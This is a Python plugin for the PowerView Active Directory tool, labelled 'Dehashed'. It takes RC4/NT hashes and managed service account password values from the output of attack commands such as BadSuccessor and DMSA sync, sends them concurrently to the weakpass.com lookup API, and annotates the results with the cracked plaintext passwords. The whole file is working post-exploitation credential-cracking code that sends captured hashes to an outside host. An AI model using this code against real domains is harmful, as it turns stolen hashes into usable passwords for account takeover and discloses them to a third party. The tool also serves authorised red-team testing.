#!/usr/bin/env python3
from __future__ import annotations

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import TYPE_CHECKING, Optional

from argparse import Namespace
from powerview.plugins import after, PowerviewPlugin

# for contributors, you dont have to include imports below. These are optional
if TYPE_CHECKING:
    from powerview.powerview import PowerView

plugin = PowerviewPlugin(
    name="Dehashed",
    description="Submit recognized RC4/NT hashes and submit them to weakpass.com to retrieve plain text",
    author="aniqfakhrul",
)

BASE_URL = "https://weakpass.com/api/v1/search"

def _quer_weakpass(hash_value: str) -> Optional[str]:
    url = f"{BASE_URL}/{hash_value}"
    headers = {
        "accept": "application/json"
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response.json()["pass"]
    except Exception:
        return None

@after(["Sample-Get-DomainGMSA", "Sample-Invoke-BadSuccessor", "Sample-Invoke-DMSASync"], priority=10)
def dehashes(pv: PowerView, args: Namespace, results: list[dict]) -> list[dict]:
    tasks = []
    for entry in results:
        attrs = entry.get("attributes", entry)
        for hash_field in ["RC4", "msDS-ManagedPassword"]:
            value = attrs.get(hash_field)
            if value is None:
                continue
            if isinstance(value, list):
                for idx, v in enumerate(value):
                    tasks.append( (attrs, hash_field, idx, v) )
            else:
                tasks.append( (attrs, hash_field, None, value) )
            break

    if not tasks:
        return results

    def process_task(task: tuple[dict, str, Optional[int], str]) -> tuple[dict, str, Optional[int], str, Optional[str]]:
        attrs, hash_field, idx, value = task
        res = _quer_weakpass(value)
        return (attrs, hash_field, idx, value, res)

    max_workers = min(16, len(tasks))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_task = {executor.submit(process_task, task): task for task in tasks}
        seen = set()
        for future in as_completed(future_to_task):
            attrs, hash_field, idx, value, res = future.result()
            if (id(attrs), hash_field) in seen and idx is None:
                continue
            seen.add((id(attrs), hash_field))
            if idx is not None:
                field_val = attrs.get(hash_field)
                if isinstance(field_val, list) and len(field_val) > idx:
                    if not res:
                        field_val[idx] = value
                    else:
                        field_val[idx] = f"{value} ({res})"
            else:
                if not res:
                    continue
                attrs[hash_field] = f"{value} ({res})"
    return results
